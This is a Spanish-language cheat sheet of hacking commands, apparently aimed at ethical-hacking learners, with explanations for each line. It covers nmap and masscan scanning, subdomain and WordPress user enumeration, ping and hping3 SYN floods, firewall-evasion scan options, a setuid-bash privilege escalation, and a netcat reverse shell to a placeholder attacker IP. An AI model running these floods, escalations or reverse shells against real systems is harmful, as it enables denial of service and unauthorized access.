
# 🏴‍☠️ **Hoja de Referencia de Comandos de Hacking**

## 🖥️ **Comandos ICMP y Ping**

```bash
1.  ping 192.168.0.1
2.  ping -s 1300 172.18.0.11
3.  ping -s 1300 -f 172.18.0.11
```

- **`ping`**: Comprueba la conectividad con un host y mide el tiempo de respuesta.
- **`-s 1300`**: Especifica el tamaño del paquete en bytes.
- **`-f`**: Envía paquetes lo más rápido posible (flood).

---

## ⚔️ **Ataques de Red con hping3**

```bash
1.  hping3 -S --flood -V -p 80 172.18.0.11
2.  hping3 --traceroute -V -1 example.com
```

- **`hping3`**: Genera tráfico de red para pruebas y ataques.
- **`-S`**: Envía paquetes SYN (SYN Flood Attack).
- **`--flood`**: Envía tráfico sin límite.
- **`--traceroute -1`**: Realiza un traceroute con paquetes ICMP.

---

## 📡 **Captura y Análisis de Tráfico**

```bash
1.  tcpdump -i any icmp
2.  grep -Hnri 'tree' | vim
3.  ptunnel
4.  iftop
5. tcpdump -w capture.pcap -i eth0
6. tcpdump -r capture_file.pcap
7. tcpdump -i eth0 -c 100
8. tshark -Y "http.request.method == 'GET'" -i eth0
9. tshark -r capture.pcap -qz endpoints,ip
10. tshark -r capture.pcap -q -z follow,tcp,ascii,0
11. tshark -e ip.src -e ip.dst -e frame.protocols -T fields -r capture.pcap
12. tshark -V -c 1 -i eth0
```

- **`tcpdump` / `tshark`**: Capturan tráfico de red para análisis.
- **`-i any`**: Captura en todas las interfaces.
- **`-w capture.pcap`**: Guarda la captura en un archivo.
- **`-q -z follow,tcp,ascii,0`**: Sigue conversaciones TCP.

---

## 🔎 **Exploración de Redes con Nmap**

```bash
1. nmap -sn 192.168.1.0/24
2. nmap -sV 192.168.1.1
3. nmap -O 192.168.1.1
4. nmap -Pn 192.168.1.1
5. nmap --script malware 192.168.1.1
6. nmap -A 192.168.1.1
7. nmap -f 192.168.1.0/24
8. nmap --source-port 53 192.168.1.0/24
9. nmap -D RND:10 192.168.1.0/24
10. nmap --script vuln 192.168.1.1
11. nmap -sL 192.168.1.0/24
```

- **`nmap`**: Escanea redes y sistemas.
- **`-sn`**: Descubre hosts activos sin escanear puertos.
- **`-sV`**: Detecta versiones de servicios.
- **`-O`**: Identifica sistemas operativos.
- **`-Pn`**: Evita el bloqueo de ICMP.

---

## 🚀 **Escaneos Rápidos con Masscan**

```bash
1. masscan -p80,443,22 10.77.14.0/24 --rate=1000
2. masscan 10.0.0.0/8 -p0-65535 --rate=10000
3. masscan -p80,443 10.0.0.0/8 --rate=1000 --randomize-hosts
4. masscan -p23 10.0.0.0/8 --rate=10000
```

- **`masscan`**: Escaneo masivo de puertos.
- **`-p80,443,22`**: Escanea puertos específicos.
- **`--rate=1000`**: Controla la velocidad de envío de paquetes.

---

## 🔥 **Enumeración de Servicios y Subdominios**

```bash
1. whois microsoft.com
2. whatweb networkchuck.coffee
3. gobuster dns -d networkchuck.com -w dns-jhaddix.txt
4. sublist3r
5. amass enum -passive -d example.com
6. amass enum -passive -d networkchuck.com
```

- **`whois`**: Obtiene información sobre un dominio.
- **`whatweb`**: Identifica tecnologías de un sitio web.
- **`gobuster dns`**: Enumera subdominios.

---

## 🛠️ **Escalación de Privilegios y Shells**

```bash
1. /bin/bash -p
2. sudo chmod +s /bin/bash
3. nc -e /bin/sh <attacker_ip> 1234
4. nc -lvp 1234
```

- **`bash -p`**: Obtiene privilegios elevados en una shell.
- **`chmod +s`**: Configura `setuid` en Bash.
- **`nc -e /bin/sh`**: Shell inversa con Netcat.

---

## 🔑 **Comandos SSH y Escaneo de Vulnerabilidades**

```bash
1. ssh networkchuck@192.168.1.1
2. ssh user@remote_host 'command_to_run'
3. ssh -D 1337 -C -q -N root@172.234.88.97
```

- **`ssh`**: Acceso remoto seguro a servidores.
- **`-D 1337`**: Proxy SOCKS dinámico.

---

## 📊 **Monitoreo de Red y Terminal**

```bash
1. iftop
2. tmux
3. tmux a
4. tmux new -s bob
```

- **`iftop`**: Monitoriza tráfico en tiempo real.
- **`tmux`**: Permite manejar múltiples terminales.

---

## 💾 **Ataques a APIs y Webhooks**

```bash
1. curl -i https://networkchuck.hackwithnahamsec.com
2. curl -i https://networkchuck.hackwithnahamsec.com -H 'X-API-TOKEN: <api token>'
```

- **`curl`**: Realiza peticiones HTTP/HTTPS.
- **`-H`**: Añade una cabecera a la petición.

---

## 🎩 **Comandos Diversos**

```bash
1. sl
2. alias ls="cat /dev/urandom"
3. grep -Hnri 'tree' | vim
4. searchsploit
5. timeout
6. wget https://github.com/danielmiessler/SecLists/raw/master/Discovery/DNS/dns-Jhaddix.txt
7. apt install seclists
8. nikto networkchuck.coffee
9. gobuster dir -u https://networkchuck.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

- **`searchsploit`**: Busca exploits en la base de datos de Exploit-DB.

# Descripcion mejorada

## 🖥️ **Comandos ICMP y Ping**

```bash
1.  ping 192.168.0.1
```

- **`ping`**: Envía paquetes ICMP para comprobar la conectividad con el host.

```bash
1.  ping -s 1300 172.18.0.11
```

- **`-s 1300`**: Especifica un tamaño de paquete de 1300 bytes.
- **Objetivo: `172.18.0.11`**: IP del host de destino.

```bash
1.  ping -s 1300 -f 172.18.0.11
```

- **`-f`**: Envía paquetes lo más rápido posible (`ping flood`).

---

## ⚔️ **Ataques de Red con hping3**

```bash
1.  hping3 -S --flood -V -p 80 172.18.0.11
```

- **`-S`**: Establece el flag SYN (SYN Flood).
- **`--flood`**: Envía paquetes sin limitación de velocidad.
- **`-V`**: Muestra salida detallada (verbose).
- **`-p 80`**: Envía tráfico al puerto 80 (HTTP).

```bash
1.  hping3 --traceroute -V -1 example.com
```

- **`--traceroute`**: Rastrea la ruta de los paquetes hasta el destino.
- **`-1`**: Usa paquetes ICMP en lugar de TCP/UDP.
- **Objetivo: `example.com`**: Dominio a analizar.

---

## 📡 **Captura y Análisis de Tráfico**

```bash
1.  tcpdump -i any icmp
```

- **`-i any`**: Captura tráfico en todas las interfaces.
- **`icmp`**: Filtra solo paquetes ICMP.

```bash
1.  grep -Hnri 'tree' | vim
```

- **`grep -Hnri`**: Busca recursivamente `tree`, ignorando mayúsculas/minúsculas.
- **`| vim`**: Abre los resultados en `vim` para edición.

```bash
1.  ptunnel
```

- **`ptunnel`**: Túnel de tráfico encapsulado en paquetes ICMP.

```bash
1.  iftop
```

- **`iftop`**: Muestra ancho de banda en tiempo real.

---

## 🔎 **Exploración de Redes con Nmap**

```bash
1. nmap -sn 192.168.1.0/24
```

- **`-sn`**: Descubre hosts activos sin escanear puertos.

```bash
1. nmap -sV 192.168.1.1
```

- **`-sV`**: Detecta versiones de los servicios en los puertos abiertos.

```bash
1. nmap -O 192.168.1.1
```

- **`-O`**: Intenta detectar el sistema operativo del objetivo.

```bash
1. nmap -Pn 192.168.1.1
```

- **`-Pn`**: Omite el ping y asume que el host está activo.

```bash
1. nmap --script malware 192.168.1.1
```

- **`--script malware`**: Ejecuta scripts de detección de malware.

```bash
1. nmap -A 192.168.1.1
```

- **`-A`**: Habilita detección de OS, versiones y traceroute.

```bash
1. nmap -f 192.168.1.0/24
```

- **`-f`**: Usa fragmentación de paquetes para evadir firewalls.

```bash
1. nmap --source-port 53 192.168.1.0/24
```

- **`--source-port 53`**: Simula tráfico de DNS para evadir filtros.

---

## 🚀 **Escaneos Rápidos con Masscan**

```bash
1. masscan -p80,443,22 10.77.14.0/24 --rate=1000
```

- **`-p80,443,22`**: Escanea los puertos 80 (HTTP), 443 (HTTPS) y 22 (SSH).
- **`--rate=1000`**: Envía 1000 paquetes por segundo.

---

## 🔥 **Enumeración de Servicios y Subdominios**

```bash
1. whois microsoft.com
```

- **`whois`**: Obtiene información de registro de un dominio.

```bash
1. whatweb networkchuck.coffee
```

- **`whatweb`**: Identifica tecnologías en el sitio web.

---

## 🛠️ **Escalación de Privilegios y Shells**

```bash
1. /bin/bash -p
```

- **`-p`**: Mantiene los privilegios del usuario actual.

```bash
1. sudo chmod +s /bin/bash
```

- **`chmod +s`**: Configura el bit `setuid`, permitiendo ejecución con privilegios elevados.

---

## 🔑 **Comandos SSH y Escaneo de Vulnerabilidades**

```bash
1. ssh -D 1337 -C -q -N root@172.234.88.97
```

- **`-D 1337`**: Proxy SOCKS en el puerto 1337.
- **`-C`**: Habilita compresión de datos.
- **`-q`**: Modo silencioso.
- **`-N`**: No ejecuta comandos, solo establece el túnel.

---

## 📊 **Monitoreo de Red y Terminal**

```bash
1. iftop
```

- **`iftop`**: Monitorea el tráfico de red en tiempo real.

```bash
1. tmux
```

- **`tmux`**: Multiplexor de terminal, permite sesiones persistentes.

---

## 💾 **Ataques a APIs y Webhooks**

```bash
1. curl -i https://networkchuck.hackwithnahamsec.com
```

- **`-i`**: Muestra encabezados HTTP en la respuesta.

```bash
1. curl -i https://networkchuck.hackwithnahamsec.com -H 'X-API-TOKEN: <api token>'
```

- **`-H 'X-API-TOKEN: <api token>'`**: Agrega un token de autenticación en la petición.

---

## 🎩 **Comandos Diversos**

```bash
1. sl
```

- **`sl`**: Muestra un tren en la terminal (broma por escribir mal `ls`).

```bash
1. alias ls="cat /dev/urandom"
```

- **`alias`**: Crea un alias para `ls`, mostrando datos aleatorios en lugar de listar archivos.

---






---



# Comandos de Hacking - Guía Rápida

1. **ping 192.168.0.1**
   - Envía paquetes ICMP echo request a 192.168.0.1 para comprobar la conectividad y medir el tiempo de respuesta. Utilizado en el hacking ético para el reconocimiento inicial para verificar si el sistema objetivo es alcanzable.

2. **ping -s 1300 172.18.0.11**
   - Envía paquetes ICMP echo request con un tamaño de 1300 bytes a 172.18.0.11. Es útil para probar cómo maneja una red o un host paquetes más grandes, lo que podría ayudar a identificar configuraciones incorrectas o vulnerabilidades relacionadas con la fragmentación.

3. **ping -s 1300 -f 172.18.0.11**
   - Envía paquetes de ping en modo de inundación con paquetes grandes (1300 bytes) a 172.18.0.11. La opción `-f` envía paquetes lo más rápido posible, lo que puede usarse para probar el estrés de los componentes de la red del objetivo y verificar vulnerabilidades de DoS.

4. **hping3 -S --flood -V -p 80 172.18.0.11**
   - Envía paquetes SYN al puerto 80 de 172.18.0.11 a alta velocidad (`--flood`), simulando un ataque de inundación SYN. La bandera `S` establece la bandera SYN, `V` habilita el modo detallado y `p 80` especifica el puerto objetivo. Este comando se usa para probar la resistencia del objetivo contra ataques de inundación SYN.

5. **hping3 --traceroute -V -1 example.com**
   - Realiza un traceroute a example.com usando paquetes ICMP (`-1`), con salida detallada (`V`). Esto se utiliza para mapear la ruta que los paquetes toman hacia el objetivo, lo que puede ayudar a identificar firewalls, routers y otros dispositivos de red.

6. **tcpdump -i any icmp**
   - Captura paquetes ICMP en todas las interfaces de red. Este comando es útil para monitorear y analizar el tráfico ICMP en busca de actividades sospechosas como barridos de ping o intentos de mapeo de red.

7. **grep -Hnri 'tree' | vim**
   - Busca recursivamente (`r`), ignorando mayúsculas y minúsculas (`i`), y en todos los archivos desde el directorio actual la cadena "tree", mostrando números de línea (`n`) y nombres de archivo (`H`). La salida se enruta a vim para editar. Se puede usar para buscar a través de códigos o archivos de configuración en busca de entradas específicas relacionadas con vulnerabilidades o configuraciones.

8. **ptunnel**
   - Establece un túnel encapsulado dentro de solicitudes y respuestas de eco ICMP. Los hackers éticos podrían usarlo para eludir restricciones de red o para comunicaciones encubiertas durante pruebas de penetración.

9. **iftop**
   - Muestra el uso de ancho de banda en las interfaces de red en tiempo real. Los hackers éticos lo usan para monitorear el tráfico de red en busca de anomalías que podrían indicar actividades maliciosas o para evaluar el impacto de sus pruebas sobre el ancho de banda de la red.

10. **:%!sort**
    - Comando dentro de vim que ordena las líneas del archivo actualmente abierto. Útil para organizar datos, como direcciones IP o URLs, durante la fase de análisis del hacking ético.

11. **:%!grep -v .git**
    - Otro comando de vim que filtra las líneas que contienen .git del archivo actualmente abierto, usando `grep -v` que invierte la coincidencia. Puede ser útil para excluir directorios de control de versiones de los resultados de búsqueda de texto en archivos de configuración o documentación.

12. **nmap -sn 192.168.1.0/24**
    - Realiza un escaneo de ping en la subred 192.168.1.0/24, identificando hosts activos sin escanear puertos. Es una herramienta básica de reconocimiento para mapear la estructura de red.

13. **nmap -sV 192.168.1.1**
    - Escanea `192.168.1.1` para identificar versiones de servicios en puertos abiertos. Esta información es crucial para descubrir versiones de software vulnerables que pueden ser explotadas.

14. **nmap -O 192.168.1.1**
    - Intenta identificar el sistema operativo de 192.168.1.1 basado en las características de su comportamiento de red. Esto ayuda a ajustar ataques específicos a las vulnerabilidades específicas del SO.

15. **nmap -Pn 192.168.1.1**
    - Escanea 192.168.1.1 sin intentar hacer ping primero, útil cuando el objetivo puede estar bloqueando solicitudes de eco ICMP. Permite un escaneo más sigiloso.

16. **nmap --script malware 192.168.1.1**
    - Escanea 192.168.1.1 con scripts de Nmap diseñados para detectar infecciones por malware. Es una forma rápida de verificar si un host está comprometido.

17. **nmap -A 192.168.1.1**
    - Realiza un escaneo agresivo en 192.168.1.1 que incluye detección de SO y versión, escaneo de scripts y traceroute. Es un escaneo integral para recopilar información detallada sobre un objetivo.

18. **nmap -f 192.168.1.0/24**
    - Escanea la subred 192.168.1.0/24 con paquetes fragmentados, lo que puede ayudar a evadir algunos sistemas IDS/IPS. Se usa para escaneos más sigilosos.

19. **nmap --source-port 53 192.168.1.0/24**
    - Escanea 192.168.1.0/24 usando el puerto de origen 53, simulando tráfico DNS. Esto puede eludir ciertas reglas de firewall que permiten el tráfico DNS.

20. **nmap -D RND:10 192.168.1.0/24**
    - Escanea 192.168.1.0/24 usando tráfico de señuelo desde IPs aleatorias (RND:10), dificultando la identificación de la verdadera fuente del escaneo. Se utiliza para anonimizar la fuente del escaneo.

21. **masscan -p80,443,22 10.77.14.0/24 --rate=1000**
    - Escanea 10.77.14.0/24 para puertos abiertos 80, 443 y 22 a una tasa de 1000 paquetes por segundo. Masscan se usa para escaneos muy rápidos sobre grandes redes o subredes.

22. **masscan 10.0.0.0/8 -p0-65535 --rate=10000**
    - Escanea todo el rango 10.0.0.0/8 para todos los puertos posibles a una alta tasa de paquetes, demostrando la capacidad de Masscan para escaneos rápidos y a gran escala.

23. **masscan -p80,443 10.0.0.0/8 --rate=1000 --randomize-hosts**
    - Escanea todo el rango 10.0.0.0/8 para los puertos 80 y 443 a una tasa de 1000 paquetes por segundo con hosts aleatorizados. Esto reduce la detección al distribuir el escaneo.

24. **masscan -p23 10.0.0.0/8 --rate=10000**
    - Apunta específicamente al puerto 23 (Telnet) en todo el rango 10.0.0.0/8 a una alta tasa. Se utiliza para identificar rápidamente servicios Telnet potencialmente vulnerables.

25. **sl**
    - Comando lúdico que muestra una animación de una locomotora de vapor a través del terminal. Aunque no está directamente relacionado con el hacking ético, puede ser una forma divertida de recordar no escribir mal `ls`.

26. **alias ls="cat /dev/urandom"**
    - Establece un alias para el comando `ls` para ejecutar `cat /dev/urandom` en su lugar, lo que hace que se muestren datos aleatorios cada vez que se escribe `ls`. Este comando es más una broma práctica y debe usarse con precaución, ya que sobrescribe el comportamiento predeterminado de un comando comúnmente usado.

27. **whois microsoft.com**
    - Obtiene información WHOIS para microsoft.com, proporcionando detalles como el registro, propiedad y contactos administrativos. Usado en reconocimiento para recopilar inteligencia sobre la propiedad de dominios.

28. **whatweb networkchuck.coffee**
    - Identifica las tecnologías utilizadas en el sitio web networkchuck.coffee, como software del servidor web, CMS, bibliotecas JavaScript, etc. Es útil para la planificación previa al ataque identificando posibles vulnerabilidades de software.

29. **nmap -sL 192.168.1.0/24**
    - Lista cada IP en la subred 192.168.1.0/24 sin enviar paquetes a ellos. Se utiliza para planificación o documentación, especialmente en redes grandes.

30. **nmap --script vuln 192.168.1.1**
    - Ejecuta los scripts de detección de vulnerabilidades de Nmap contra 192.168.1.1. Este enfoque automatizado ayuda a identificar vulnerabilidades conocidas que pueden ser explotadas.

31. **tshark -Y'http.request.method == "GET"' -i eth0**
    - Filtra y captura solicitudes HTTP GET en la interfaz eth0. Este comando es particularmente útil para analizar el tráfico web e identificar solicitudes potencialmente maliciosas o no autorizadas.

32. **timeout**
    - Este comando se usa para ejecutar un comando especificado con un límite de tiempo, después del cual se terminará si aún está en ejecución. Es un mecanismo de control para asegurar que los comandos de larga ejecución no excedan un tiempo deseado, útil tanto en escenarios de hacking ético scriptado como interactivo.

33. **tshark -r capture.pcap -qz endpoints,ip**
    - Analiza un archivo pcap (capture.pcap) para resumir estadísticas de endpoints IP, proporcionando información sobre patrones de comunicación, intentos de exfiltración de datos o escaneos de red.

34. **tshark -r capture.pcap -q -z follow,tcp,ascii,0**
    - Sigue el flujo de la primera conversación TCP en un archivo pcap en ASCII, ayudando a reconstruir el contenido de sesiones o detectar comunicaciones maliciosas dentro del tráfico capturado.

35. **tshark -e ip.src -e ip.dst -e frame.protocols -T fields -r capture.pcap**
    - Extrae la IP fuente, IP destino y la información de protocolos de los paquetes en un archivo pcap, presentando los datos en un formato basado en campos. Esto es útil para analizar rápidamente detalles específicos del tráfico de red.

36. **tmux**
    - Multiplexor de terminal que permite acceder a múltiples sesiones de terminal simultáneamente dentro de una sola ventana. Los hackers éticos lo utilizan para gestionar múltiples tareas en línea de comandos eficientemente durante pruebas o al explotar vulnerabilidades.

37. **tmux new -s bob**
    - Crea una nueva sesión de tmux nombrada "bob". Esto permite a un hacker ético organizar su trabajo en sesiones nombradas, facilitando la gestión de tareas complejas.

38. **wget**
    - Descarga una lista de palabras específica para la enumeración de DNS del repositorio de GitHub SecLists. Estas listas se usan para descubrir subdominios y otras tareas de reconocimiento relacionadas con DNS.

39. **gobuster dns -d networkchuck.com -w dns-jhaddix.txt**
    - Realiza una enumeración de subdominios DNS en networkchuck.com usando la lista de palabras dns-Jhaddix.txt. Es un método para descubrir subdominios que podrían revelar superficies de ataque adicionales.

40. **sublist3r**
    - Herramienta utilizada para una enumeración rápida de subdominios, recopilando datos de motores de búsqueda, sitios web y servidores DNS. Ayuda a descubrir dominios adicionales asociados con el objetivo para una mayor exploración y evaluación de vulnerabilidades.

41. **wpscan --url chuckkeith.com --enumerate u**
    - Escanea el sitio de WordPress en chuckkeith.com para enumerar usuarios, intentando listar cuentas de usuario. Esta información puede usarse para ataques de fuerza bruta o campañas de phishing.

42. **wpscan --url chuckkeith.com --enumerate p**
    - Este comando usa WPScan, un escáner de vulnerabilidades de WordPress, para enumerar plugins instalados en el sitio web chuckkeith.com. Es crucial para hackers éticos identificar plugins potencialmente vulnerables que podrían ser explotados.

43. **wpscan --url <http://example.com> --enumerate vp,vt --plugins-detection aggressive**
    - Ejecuta WPScan contra http://example.com para enumerar de manera agresiva plugins vulnerables (`vp`) y temas (`vt`), posiblemente descubriendo debilidades de seguridad. El modo de detección agresiva aumenta las posibilidades de encontrar componentes ocultos o menos obvios.

44. **amass enum -passive -d example.com**
    - Ejecuta una enumeración de dominio pasiva para example.com usando la herramienta Amass. Este método recopila información sin interactuar directamente con los servidores web del objetivo, reduciendo el riesgo de detección. Es útil para mapear la superficie de ataque externa de un objetivo.

45. **amass enum -passive -d networkchuck.com**
    - Similar al comando anterior, realiza una enumeración pasiva del dominio networkchuck.com, recogiendo datos de fuentes públicas para identificar subdominios e IPs asociados sin alertar al objetivo.

46. **git**
    - Refiere al uso de Git, un sistema de control de versiones, para clonar repositorios como bases de datos de exploits o herramientas útiles en el hacking ético. Por ejemplo, clonar un repositorio de exploits puede proporcionar a un hacker ético recursos para probar sistemas en busca de vulnerabilidades.

47. **searchsploit**
    - Herramienta de búsqueda en línea de comandos para la base de datos de exploits, permitiendo a los usuarios buscar vulnerabilidades conocidas y exploits. Los hackers éticos la usan para encontrar exploits para vulnerabilidades identificadas en sistemas o aplicaciones. Ejemplos de uso incluirían `searchsploit wordpress plugins` o `searchsploit ssh`.

48. **/bin/bash -p**
    - Invoca un nuevo shell de Bash con la opción `-p`, que preserva los privilegios de UID y GID efectivos. Esto puede usarse en escenarios de escalada de privilegios cuando se explota un script o programa con setuid para mantener privilegios elevados.

49. **sudo chmod +s /bin/bash**
    - Aplica el bit setuid (`+s`) a /bin/bash, haciendo que se ejecute con los privilegios del propietario del archivo (típicamente root) para cualquier usuario que lo ejecute. Este comando es un ejemplo clásico de técnica de escalada de privilegios, permitiendo a un usuario con pocos privilegios obtener acceso de root a través de una nueva instancia de shell.

50. **tcpdump -w capture.pcap -i eth0**
    - Captura el tráfico de red en la interfaz eth0 y lo escribe en un archivo llamado capture.pcap. Esta es una técnica fundamental para capturar y analizar paquetes de red para detectar anomalías o actividades maliciosas.

51. **tcpdump -r capture_file.pcap**
    - Lee paquetes desde un archivo pcap (capture_file.pcap), permitiendo un análisis fuera de línea del tráfico de red capturado. Es útil para investigaciones detalladas de eventos o incidentes específicos de red.

52. **tcpdump -i eth0 -c 100**
    - Captura los primeros 100 paquetes en la interfaz eth0, limitado el captura a un número manejable de paquetes para un análisis o demostración rápida.

53. **tshark -V -c 1 -i eth0**
    - Captura y muestra información detallada sobre un solo paquete en la interfaz eth0. Tshark, siendo la versión de línea de comandos de Wireshark, es útil para análisis detallado de paquetes en entornos de terminal.

54. **wget**
    - <https://github.com/danielmiessler/SecLists/raw/master/Discovery/DNS/dns-Jhaddix.txt>
    - Descarga una lista de palabras específica para la enumeración de DNS desde el repositorio de GitHub SecLists. Estas listas se usan para descubrir subdominios y otras tareas de reconocimiento relacionadas con DNS.

55. **apt install seclists**
    - Instala el paquete seclists, que contiene una colección de listas de palabras precompiladas para diferentes evaluaciones de seguridad, incluyendo contraseñas, cargas útiles de fuzzing y enumeración de directorios.

56. **curl -i <https://networkchuck.hackwithnahamsec.com>**
    - Envía una solicitud GET HTTP a https://networkchuck.hackwithnahamsec.com, mostrando las cabeceras completas de la respuesta HTTP (opción `i`). Este comando es útil para el reconocimiento web, permitiendo a los hackers éticos recopilar información sobre el servidor web, incluyendo versiones de software y cookies.

57. **curl -i <https://networkchuck.hackwithnahamsec.com> -H 'X-API-TOKEN: <api token>'**
    - Envía una solicitud GET HTTP con una cabecera personalizada `X-API-TOKEN` para autenticación. Esto se usa frecuentemente en pruebas de API para asegurar que los endpoints protegidos sean seguros y solo accesibles con los tokens de autenticación correctos.

58. **nikto networkchuck.coffee**
    - Realiza un escaneo exhaustivo del servidor web contra networkchuck.coffee para detectar archivos peligrosos, software de servidor obsoleto y otras vulnerabilidades. Nikto se usa para pruebas de seguridad de aplicaciones web.

59. **gobuster dir -u <https://networkchuck.com> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt**
    - Utiliza fuerza bruta para enumerar directorios y archivos en https://networkchuck.com usando una lista de palabras específica. Gobuster ayuda a encontrar recursos ocultos que no se pretendían ser accesibles públicamente.

60. **tmux a**
    - Ataque al última sesión de tmux. Útil para volver a una sesión previamente desatachada, asegurando la continuidad en el proceso de hacking ético.

61. **ssh networkchuck@192.168.1.1**
    - Inicia una conexión SSH a 192.168.1.1 con el nombre de usuario `networkchuck`. SSH es utilizado por hackers éticos para comunicaciones seguras, encriptadas con objetivos durante evaluaciones o para establecer canales seguros para explotación adicional.

62. **ssh user@remote_host 'command_to_run'**
    - Ejecuta un comando específico en `remote_host` vía SSH como `user`. Esto permite a los hackers éticos ejecutar comandos remotamente en un sistema objetivo, que puede ser parte de las fases de explotación o post-explotación.

63. **ssh -D 1337 -C -q -N root@172.234.88.97**
    - Establece una conexión SSH a 172.234.88.97 como `root`, creando un proxy dinámico SOCKS en el puerto local 1337 (`-D 1337`), con compresión (`-C`), en modo silencioso (`-q`), sin ejecutar un comando remoto (`-N`). Esto puede usarse para navegación segura y anónima a través del objetivo, o para eludir restricciones de red durante evaluaciones de hacking ético.

64. **nc reverse shell**
    - `nc -e /bin/sh <attacker_ip> 1234`: Establece una conexión de shell inversa desde el objetivo hasta la máquina del atacante (`<attacker_ip>`) en el puerto `1234`, ejecutando `/bin/sh` para acceso a shell. Este comando utiliza `netcat (nc)` para acceso de backdoor al sistema objetivo.
    - `nc -lvp 1234`: Escucha en el puerto `1234` para conexiones entrantes, típicamente utilizado por el atacante para recibir la shell inversa del objetivo. La opción `l` escucha una conexión entrante, `v` es para salida detallada, y `p` especifica el puerto.

65. **nc simple chat server**
    - `nc -lvp 1234`: Configura un listener en el puerto `1234` que podría actuar como un servidor de chat simple. Esto demuestra la versatilidad de `netcat` para crear servicios de red rápidos y temporales.
    - `nc -v <ipaddress> 1234`: Se conecta al servidor de chat alojado en `<ipaddress>` en el puerto `1234`. Esto muestra la capacidad de `netcat` para ser utilizado en configuraciones de comunicación cliente-servidor simples.
